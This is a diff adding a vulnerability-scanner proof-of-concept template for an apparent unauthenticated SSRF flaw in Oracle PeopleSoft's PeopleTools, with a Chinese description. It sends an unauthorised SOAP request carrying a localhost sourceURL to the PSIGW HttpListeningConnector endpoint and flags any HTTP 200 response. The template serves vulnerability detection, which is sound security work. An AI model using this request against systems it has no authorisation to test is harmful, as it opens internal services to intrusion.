@@ -1,0 +1,34 @@
+[info]
+author = "ave"
+description = "检测 Oracle PeopleSoft PeopleTools Update Environment Management 组件缺失认证漏洞（CWE-306），通过向 /PSIGW/HttpListeningConnector 发送未授权 SOAP 请求触发 SSRF，验证目标是否存在该漏洞"
+id = "POC-AVE-2026-0100"
+name = "PoC for AVE-2026-0100"
+severity = "critical"
+tags = [
+    "cve-2026-35273",
+    "ave-2026-0100",
+]
+vuln_id = [
+    "CVE-2026-35273",
+    "AVE-2026-0100",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/PSIGW/HttpListeningConnector"
+protocol = "http"
+
+[poc.requests.body]
+content = "<Envelope><Body><EnvironmentManagement><sourceURL>http://localhost/</sourceURL></EnvironmentManagement></Body></Envelope>"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/xml"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
